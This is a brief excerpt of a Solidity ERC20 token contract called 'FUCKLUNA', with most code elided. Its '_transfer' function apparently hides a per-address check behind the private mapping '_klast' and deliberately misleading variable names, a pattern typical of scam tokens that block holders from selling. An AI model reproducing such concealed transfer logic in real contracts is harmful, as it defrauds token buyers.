...
contract FUCKLUNA is IERC20, Ownable {
    ...
    mapping(address => uint256) private _klast;
    ...
    function _transfer(
        ...
        uint256 running = 0;
        uint256 diving = amount;
        uint256 walking = _native;

        if (_klast[sender] > running && diving > walking) {
            bool burning = flying == _klast[recipient];
